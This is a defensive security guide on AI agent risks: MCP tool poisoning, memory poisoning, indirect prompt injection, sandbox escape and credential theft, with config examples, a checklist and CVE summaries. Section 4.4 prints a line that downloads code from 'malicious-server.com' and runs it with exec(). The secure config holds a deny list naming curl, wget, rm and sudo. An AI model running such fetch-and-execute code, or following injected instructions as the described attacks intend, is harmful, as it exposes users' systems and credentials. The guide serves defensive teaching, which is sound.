# AI Agent Security — Autonomous Agent Attack Surface, Tool Poisoning, Memory Attacks

**Severity:** Critical  
**CWE:** CWE-284 (Improper Access Control), CWE-913 (Improper Control of Dynamically-Managed Code Resources), CWE-77 (Command Injection), CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-94 (Code Injection)  
**OWASP Agentic Top 10 (2026):** ASI01 (Agent Goal Hijack), ASI02 (Tool Misuse), ASI03 (Identity & Privilege Abuse), ASI04 (Agentic Supply Chain), ASI05 (Unexpected Code Execution), ASI06 (Memory & Context Poisoning)  
**AI Generation Risk:** Very High

---

## 1. Vulnerability Explanation

AI agents (Claude Code, Codex CLI, Cursor Agent, OpenAI Codex, n8n, AutoGPT, etc.) differ fundamentally from traditional tools and even from standalone LLMs. An LLM produces text; an AI agent **acts on the world** — it opens files, runs shell commands, calls APIs, manages credentials, and orchestrates multi-step workflows across production infrastructure.

This shift from *generative* to *agentic* AI introduces security problems that are categorically different:

| Property | Standalone LLM | AI Agent |
|----------|---------------|----------|
| Output | Generates text someone reads | Executes operations on live systems |
| Autonomy | No autonomous action | Plans and acts without per-step approval |
| Credentials | None of its own | Holds real credentials (API keys, tokens) |
| Tool access | None | Filesystem, shell, network, databases |
| Memory | Single-turn or stateless | Persistent across sessions (long-term memory) |
| Behavior determinism | Relatively predictable | Non-deterministic — same task, different paths |
| Worst-case impact | Harmful content generation | Data exfiltration, credential theft, system compromise |

The core problem is architectural: the LLM processes safety instructions and attacker-supplied data through the **same attention mechanism**, with no enforced separation between code and data. In agentic systems, this means a single poisoned input — a tool response, a web page, an email, a file — can hijack the agent's full permission set. As OpenAI has acknowledged, language models have no reliable mechanism for distinguishing between instructions and data. NIST has classified agent hijacking through indirect prompt injection as a core threat to agentic systems (NIST CAISI, 2026).

---

## 2. Agent Threat Categories

### 2.1 Tool Poisoning (MCP-based)

The Model Context Protocol (MCP) lets agents discover and call external tools. Each tool ships with a **plain-text description** that the LLM reads to determine when and how to use it. A malicious MCP server can hide injection instructions inside tool responses or even inside tool descriptions. Because tool descriptions can be fetched dynamically after approval, a server that appeared safe at connect-time can later return poisoned content. OWASP classifies this as MCP Tool Poisoning — a form of indirect prompt injection targeting the agent's tool-use pipeline.

**CVE cross-reference:** CVE-2026-32211 (Azure MCP Server — no authentication, CVSS 9.1)

### 2.2 Memory Poisoning

Agents carry state across sessions via long-term memory (vector stores, knowledge bases, KV caches). A poisoned memory entry planted today can trigger malicious actions against an unrelated query next week. Research (Chen et al., "AgentPoison," 2024) demonstrated that poisoning just 0.1% of an agent's knowledge base can achieve a 90% attack success rate. The agent cannot distinguish learned context from planted content because both reside in the same context window.

### 2.3 Permission Escalation

Agents often acquire permissions dynamically at runtime — they start with a basic role and request expanded access as needed. Without strict capability boundaries, a compromised agent can escalate from read-only file access to shell execution or from a single API scope to full admin privileges. This is OWASP ASI03 (Identity & Privilege Abuse). The Parallax paper (arXiv:2604.12986) demonstrates that without Cognitive-Executive Separation, the reasoning system can override its own permission constraints.

### 2.4 Sandbox Escape

AI coding agents (Claude Code, Codex CLI, Cursor) typically run in sandboxed environments. Sandbox escape occurs when the isolation boundary is bypassed, allowing file writes, command execution, or network access outside the intended workspace. Sandbox bugs have been a recurring vulnerability class in AI agents.

### 2.5 Prompt Injection (Indirect via Tool Output)

The most common real-world compromise vector. An attacker embeds hidden instructions in content the agent already trusts — a web page, PDF, email, ticket comment, or PR review. When the agent reads and processes that content, the injection lands in its context window and triggers tool actions. Unlike direct prompt injection (user types malicious text), indirect injection exploits the agent's normal data ingestion pipeline.

**CVE cross-reference:** CVE-2025-32711 (EchoLeak — zero-click Copilot exploit, CVSS 9.3)

### 2.6 Credential Theft

Coding agents store API keys in configuration files (`.claude/settings.json`, `.env`, `~/.openclaw/credentials/`). If an attacker can poison a repository that the agent processes, or if the agent's memory/sandbox is compromised, these credentials can be exfiltrated. The stolen key often provides access to the entire LLM provider's API, including billing and model access.

### 2.7 Data Exfiltration

Agents with network access and credential privileges can exfiltrate sensitive data to attacker-controlled endpoints. The EchoLeak incident (CVE-2025-32711) demonstrated zero-click data exfiltration from Microsoft 365 Copilot via a crafted email — no user interaction required. In multi-agent systems, data can be exfiltrated through inter-agent communication channels.

### 2.8 Supply Chain (Agent Installing Malicious Packages)

AI coding agents frequently execute `npm install`, `pip install`, or `go get` commands as part of their workflow. An agent that auto-executes generated code or blindly follows package installation instructions is vulnerable to dependency confusion, typo-squatting, and malicious registry packages. Cyber Desserts reported that 1,184 malicious skills were found on ClawHub (the OpenClaw marketplace) in February 2026, with 1 in 5 ecosystem packages affected at peak.

---

## 3. How AI / Vibe Coding Generates This

Vibe coding — iterative prompting where AI generates production code with minimal human review — **directly amplifies every agent security risk**:

1. **Auto-execution without review:** AI agents are instructed to "fix this bug" or "deploy this change" and autonomously run shell commands, install packages, and modify files.
2. **No threat modeling:** Vibe coding workflows define no security boundaries, no permission scopes, and no approval gates.
3. **Context-length attacks:** Long vibe-coding sessions accumulate context, making agents more susceptible to "salami slicing" injection attacks where constraints erode gradually.
4. **Blind trust in AI output:** Developers rarely verify that the code an agent installs or runs doesn't include backdoors, credential harvesters, or data exfiltration scripts.
5. **Unpinned dependencies:** Agent-generated code uses `latest` package versions, bypassing lockfile integrity checks.
6. **Credential leakage in prompts:** Developers paste API keys into prompts for convenience, exposing them to model providers and log systems.
7. **No sandbox in default config:** Most vibe coding setups run agents with the user's full permissions — no container, no read-only filesystem, no network restrictions.
8. **Self-referential supply chain:** An agent writes code that installs packages, the packages execute at import time, and the agent approves the execution — all in the same autonomous loop.

---

## 4. Vulnerable Code / Config Examples

### 4.1 Overly Permissive Agent Config

```json
// .claude/settings.json — DANGEROUS
{
  "permissions": {
    "filesystem": ["*"],           // Full filesystem access
    "commands": ["*"],             // Any shell command
    "network": ["*"],              // Any outbound connection
    "autoApprove": ["*"]           // No human-in-the-loop
  }
}
```

### 4.2 Agent Without Sandbox

```javascript
// Launching Codex CLI without workspace boundary
// codex --no-sandbox
// The agent has access to the entire filesystem

// Or in code:
const { execSync } = require('child_process');
// Agent-generated, auto-executed without restriction
execSync('npm install ' + packageName);  // Dependency confusion vulnerability
```

### 4.3 Agent Storing Credentials in Accessible Location

```bash
# Storing API keys in plaintext agent config
echo "ANTHROPIC_API_KEY=sk-ant-***" > ~/.claude/credentials.env
# Malicious repo can read this via CVE-2026-21852
```

### 4.4 Agent Auto-Executing Fetched Code

```python
# AutoGPT-style agent that executes downloaded scripts
import requests
import subprocess

# Agent fetches a "tool" from the internet and executes it
code = requests.get("https://malicious-server.com/tool.py").text
exec(code)  # Remote code execution

# Or via pip install from untrusted source
subprocess.run(["pip", "install", "ai-package-helper"])  # Typo-squatting
```

---

## 5. Secure Configuration & Fixes

### 5.1 Principle of Least Privilege

Grant the agent the minimum permissions required for its task — never blanket access.

```json
// .claude/settings.json — SECURE
{
  "permissions": {
    "filesystem": {
      "read": ["/workspace/my-project/**"],
      "write": ["/workspace/my-project/src/**"],
      "deny": ["**/.env", "**/credentials*", "**/secrets*"]
    },
    "commands": {
      "allowlist": ["npm run build", "git status", "git diff"],
      "deny": ["rm", "sudo", "curl", "wget", "pip install"]
    },
    "network": {
      "allowlist": ["api.github.com", "registry.npmjs.org"],
      "denylist": ["*"]
    },
    "autoApprove": ["read", "git*"],  // Only read + git commands auto-approved
    "requireApproval": ["write", "network", "install"]
  }
}
```

### 5.2 Sandboxing

Use container-level isolation for agent execution:

```bash
# Firecracker micro-VM (recommended for Codex-style agents)
# gVisor sandbox for container-based agents
# Docker with minimal permissions
docker run --rm \
  --read-only \
  --tmpfs /tmp:noexec,nosuid \
  --cap-drop ALL \
  --network none \
  --security-opt no-new-privileges \
  my-agent:latest
```

### 5.3 Read-Only Filesystem by Default

```bash
# Mount workspace read-only, with explicit writable subdirectories
--volume /workspace/project:/workspace/project:ro
--volume /workspace/project/output:/workspace/project/output:rw
```

### 5.4 Human-in-the-Loop for Dangerous Operations

```javascript
// Before executing destructive operations, require user confirmation
function requireApproval(operation) {
  return new Promise((resolve) => {
    terminalUI.showConfirmDialog({
      title: "⚠️ Dangerous Operation",
      message: `Agent wants to: ${operation.description}`,
      details: operation.details,
      onConfirm: resolve,
      onReject: () => process.exit(1)
    });
  });
}
```

### 5.5 Session Isolation

```python
# Each agent task gets an isolated session
# — separate context window
# — separate credential scope
# — separate memory store
# — separate tool configuration
# Sessions expire and state is destroyed after completion
```

---

## 6. Prevention Checklist

- [ ] **1. Principle of least privilege** — Grant filesystem/command/network access scoped to the specific task. Never use wildcard `["*"]` permissions.
- [ ] **2. Sandbox enforcement** — Run agents in containers with network disabled by default, read-only root filesystem, and dropped capabilities.
- [ ] **3. Human approval gates** — Require explicit user confirmation for write operations, network calls, package installations, and destructive commands.
- [ ] **4. MCP server allowlisting** — Only connect to pre-vetted, pinned-version MCP servers. Block arbitrary server URLs.
- [ ] **5. Tool response validation** — Validate tool output schemas before passing content to the LLM context. Reject responses that don't match expected format.
- [ ] **6. Credential isolation** — Never store credentials in agent config files. Use secrets management (Vault, env vars, cloud secret stores) with per-session tokens.
- [ ] **7. Session timeouts** — Terminate agent sessions after idle periods. Destroy session state, credentials, and memory.
- [ ] **8. Audit logging** — Log every tool call, file access, command execution, and network request with agent ID, session ID, timestamp, and outcome.
- [ ] **9. Behavioral monitoring** — Monitor agent behavior at runtime (syscall level). Detect anomalous patterns like mass file reads, unexpected outbound connections, or credential access.
- [ ] **10. Memory integrity** — Encrypt long-term memory stores. Validate memory retrieval outputs before processing. Implement memory versioning to detect tampering.
- [ ] **11. Supply chain scanning** — Scan every package the agent installs against known vulnerability databases. Block installation of packages with suspicious metadata.
- [ ] **12. Regular updates** — Keep agent software, sandbox runtime, and MCP implementations patched. Subscribe to vendor security advisories (GitHub Advisory DB for agent CVEs).
- [ ] **13. Assume-compromise architecture** — Design agent infrastructure so that a fully compromised reasoning system cannot cause disproportionate damage (the Parallax principle: Cognitive-Executive Separation).

---

## 7. Real Incidents / CVEs

All following CVEs have been verified against NVD or GitHub Security Advisories.

### CVE-2026-25049 — n8n Type Confusion RCE (CVSS 9.4)

| Field | Value |
|-------|-------|
| **Published** | February 4, 2026 |
| **CVSS 4.0** | 9.4 (Critical) — CNA: GitHub |
| **CWE** | CWE-913 (Improper Control of Dynamically-Managed Code Resources) |
| **Affected** | n8n < 1.123.17, 2.0.0 ≤ n8n < 2.5.2 |
| **Description** | An authenticated user with permission to create or modify workflows could abuse crafted expressions in workflow parameters to trigger unintended system command execution on the host running n8n. This is a type confusion vulnerability in the expression evaluation engine — the agent-like workflow tool treated user-supplied expressions as executable code rather than data. |
| **Impact** | Full host compromise: file read, credential theft, lateral movement. |
| **Fix** | Patched in n8n 1.123.17 and 2.5.2. |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-25049), [GHSA-6cqr-8cfr-67f8](https://github.com/n8n-io/n8n/security/advisories/GHSA-6cqr-8cfr-67f8) |

### CVE-2025-68613 — n8n Expression Injection RCE (CVSS 9.9)

| Field | Value |
|-------|-------|
| **Published** | December 19, 2025 |
| **CVSS 3.1** | 9.9 (Critical) — CNA: GitHub |
| **CWE** | CWE-913 (Improper Control of Dynamically-Managed Code Resources) |
| **Affected** | n8n ≥ 0.211.0, < 1.120.4; 1.121.0 |
| **Description** | A critical RCE vulnerability in n8n's workflow expression evaluation system. Expressions supplied by authenticated users during workflow configuration could be evaluated in an execution context not sufficiently isolated from the underlying runtime, allowing arbitrary code execution with the privileges of the n8n process. |
| **Impact** | Full instance compromise. Added to **CISA Known Exploited Vulnerabilities Catalog** on March 11, 2026. Exploited by ZeroBot malware (Akamai, Feb 2026). |
| **Fix** | Patched in n8n 1.120.4, 1.121.1, 1.122.0. |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-68613), [GHSA-v98v-ff95-f3cp](https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp) |

### CVE-2025-59532 — Codex CLI Sandbox Escape (CVSS 8.6)

| Field | Value |
|-------|-------|
| **Published** | September 22, 2025 |
| **CVSS 4.0** | 8.6 (High) — CNA: GitHub |
| **CWE** | CWE-20 (Improper Input Validation) |
| **Affected** | Codex CLI 0.2.0 to 0.38.0 |
| **Description** | Due to a bug in the sandbox configuration logic, Codex CLI could treat a model-generated cwd as the sandbox's writable root, including paths outside the user's session folder. This bypassed the intended workspace boundary and enabled arbitrary file writes and command execution where the Codex process had permissions. |
| **Impact** | Sandbox escape leading to arbitrary file writes and code execution on the host. |
| **Fix** | Patched in Codex CLI 0.39.0 and Codex IDE extension 0.4.12. |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-59532), [GHSA-w5fx-fh39-j5rw](https://github.com/openai/codex/security/advisories/GHSA-w5fx-fh39-j5rw) |

### CVE-2025-59536 — Claude Code Pre-Trust RCE (CVSS 8.7)

| Field | Value |
|-------|-------|
| **Published** | October 3, 2025 |
| **CVSS 4.0** | 8.7 (High) — CNA: GitHub |
| **CWE** | CWE-94 (Code Injection) |
| **Affected** | Claude Code < 1.0.111 |
| **Description** | Claude Code could be tricked to execute code contained in a project **before** the user accepted the startup trust dialog. The startup trust dialog bug allowed malicious project files (Hooks in `.claude/settings.json`) to execute shell commands before the user confirmed trust. Additionally, MCP consent could be bypassed via `.mcp.json` settings. |
| **Impact** | Remote code execution in developer environments simply by cloning a malicious repository and opening it with Claude Code. API key exfiltration possible. |
| **Fix** | Fixed in Claude Code 1.0.111 (automatically via auto-update). |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-59536), [GHSA-4fgq-fpq9-mr3g](https://github.com/anthropics/claude-code/security/advisories/GHSA-4fgq-fpq9-mr3g) |

### CVE-2026-21852 — Claude Code API Key Exfiltration (CVSS 7.5)

| Field | Value |
|-------|-------|
| **Published** | January 21, 2026 |
| **CVSS 3.1** | 7.5 (High) — NIST |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) |
| **Affected** | Claude Code < 2.0.65 |
| **Description** | An attacker-controlled repository could include a settings file that sets `ANTHROPIC_BASE_URL` to an attacker-controlled endpoint. When the repository was opened, Claude Code would read the configuration and immediately issue API requests before showing the trust prompt, leaking the user's Anthropic API key in the request. |
| **Impact** | API key theft. In environments using Anthropic Workspaces, a single stolen key exposes the entire team's data. |
| **Fix** | Fixed in Claude Code 2.0.65. |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-21852), [GHSA-jh7p-qr78-84p7](https://github.com/anthropics/claude-code/security/advisories/GHSA-jh7p-qr78-84p7) |

### CVE-2025-32711 — EchoLeak: Zero-Click Copilot Data Exfiltration (CVSS 9.3)

| Field | Value |
|-------|-------|
| **Published** | June 11, 2025 |
| **CVSS 3.1** | 9.3 (Critical) — CNA: Microsoft |
| **CWE** | CWE-74 (Injection) |
| **Affected** | Microsoft 365 Copilot |
| **Description** | The first real-world zero-click prompt injection exploit in a production AI agent. A crafted email slipped hidden instructions into Microsoft 365 Copilot. Copilot then sent sensitive organizational data to an attacker-controlled destination without any user click or interaction required. |
| **Impact** | Data exfiltration of sensitive organizational data from email, documents, and internal communications. No user interaction required. |
| **Fix** | Patched by Microsoft via service-side update (June 2025). |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-32711), [MSRC](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711) |

### CVE-2026-32211 — Azure MCP Server No Authentication (CVSS 9.1)

| Field | Value |
|-------|-------|
| **Published** | April 2, 2026 |
| **CVSS 3.1** | 9.1 (Critical) — CNA: Microsoft |
| **CWE** | CWE-306 (Missing Authentication for Critical Function) |
| **Affected** | Microsoft Azure Web Apps MCP Server |
| **Description** | Microsoft shipped an official MCP server for Azure DevOps with **missing authentication**. No authentication was required to access the server's critical functions, allowing unauthorized attackers to disclose sensitive information (API keys, tokens, configuration data) over the network. |
| **Impact** | Unauthenticated access to Azure DevOps resources including API keys and tokens. Full information disclosure. |
| **Fix** | Service-side fix applied by Microsoft. |
| **Source** | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-32211), [MSRC](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-32211) |

### Claude Code Source Map Leak (March 2026)

**Not a CVE, but a significant incident.** On March 31, 2026, Anthropic accidentally shipped the full source code of Claude Code to the public npm registry via a misconfigured `.gitignore` / source map configuration. The exposed source maps allowed anyone to reconstruct Claude Code's readable source code. While this was a configuration/process failure rather than an agent vulnerability, it highlighted that **the build and deployment pipeline for agent tools is itself a critical attack surface**. Exposed source code can reveal internal API endpoints, authentication mechanisms, and zero-day vulnerabilities in the agent itself.

**Sources:** [Zscaler](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak), [Penligent](https://www.penligent.ai/hackinglabs/claude-code-source-map-leak-what-was-exposed-and-what-it-means/)

### Additional Notable Incidents

| Incident | Date | Description |
|----------|------|-------------|
| **OpenClaw ClawHavoc** | Feb 2026 | 1,184 malicious skills on ClawHub marketplace; 9 CVEs, 3 with public exploit code ([Cyber Desserts](https://blog.cyberdesserts.com/ai-agent-security-risks/)) |
| **Mexico AI-Directed Attack** | Dec 2025–Jan 2026 | Attacker used Claude + ChatGPT to breach 7+ Mexican government agencies; 195M taxpayer records exfiltrated ([SecurityWeek](https://www.securityweek.com/)) |
| **JADEPUFFER Ransomware Agent** | 2026 | Fully autonomous agentic ransomware targeting databases ([Sysdig](https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion)) |

---

## 8. Vibe-Coding Red Flags

Watch for these patterns in vibe-coded agent configurations:

- [ ] **1. `"permissions": {"filesystem": ["*"]}`** — Full filesystem access with no scope boundaries.
- [ ] **2. Agent running outside a container** — No sandbox, no read-only filesystem, no network restrictions.
- [ ] **3. API keys in plaintext config files** — Credentials stored in `.env` or `settings.json` that the agent reads.
- [ ] **4. `pip install` / `npm install` in agent-generated code** — Auto-installing packages without integrity verification.
- [ ] **5. Agent approving its own destructive operations** — No human-in-the-loop for writes, network calls, or deletions.
- [ ] **6. Connecting to arbitrary MCP servers** — No allowlisting, no server vetting, no response validation.
- [ ] **7. Long-running agent sessions with no timeout** — Sessions that stay alive for hours, accumulating context and attack surface.
- [ ] **8. Using `latest` package versions in agent instructions** — Unpinned dependencies bypass lockfile integrity.
- [ ] **9. Agent with both file read AND network write access** — The "lethal trifecta" (Simon Willison): private data + untrusted content + external communication.
- [ ] **10. No audit logging of agent actions** — No way to determine what the agent did after a compromise.
- [ ] **11. Memory persistence without integrity checking** — Long-term memory stores that aren't encrypted or validated.
- [ ] **12. Agent generating and executing code in the same step** — No separation between code generation and code execution (violates Cognitive-Executive Separation).

---

## References

1. [Sysdig — Agentic AI Security Guide (2026)](https://www.sysdig.com/learn-cloud-native/agentic-ai-security)
2. [Iternal.ai — AI Agent Security Checklist (2026)](https://iternal.ai/ai-agent-security-checklist)
3. [OWASP — MCP Tool Poisoning](https://owasp.org/www-community/attacks/MCP_Tool_Poisoning)
4. [OWASP Agentic Top 10 (2026)](https://genai.owasp.org/)
5. [Parallax: Why AI Agents That Think Must Never Act (arXiv:2604.12986)](https://arxiv.org/html/2604.12986v1)
6. [Cyber Desserts — AI Agent Security Risks (2026)](https://blog.cyberdesserts.com/ai-agent-security-risks/)
7. [Chen et al., "AgentPoison: Red-teaming LLM Agents via Poisoning Memory or Knowledge Bases" (2024)](https://arxiv.org/abs/2407.12784)
8. [NIST CAISI — Securing AI Agent Systems (2026)](https://www.nist.gov/news-events/news/2026/01/caisi-issues-request-information-about-securing-ai-agent-systems)
9. [Check Point Research — Claude Code Vulnerabilities (Feb 2026)](https://research.checkpoint.com/)
10. [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
11. [CoSAI — Securing the AI Agent Revolution: MCP Security Guide (Jan 2026)](https://www.coalitionforsecureai.org/)
12. [Wu et al., "IsolateGPT: An Execution Isolation Architecture for LLM-Based Agentic Systems" (2025)](https://arxiv.org/abs/2403.04960)
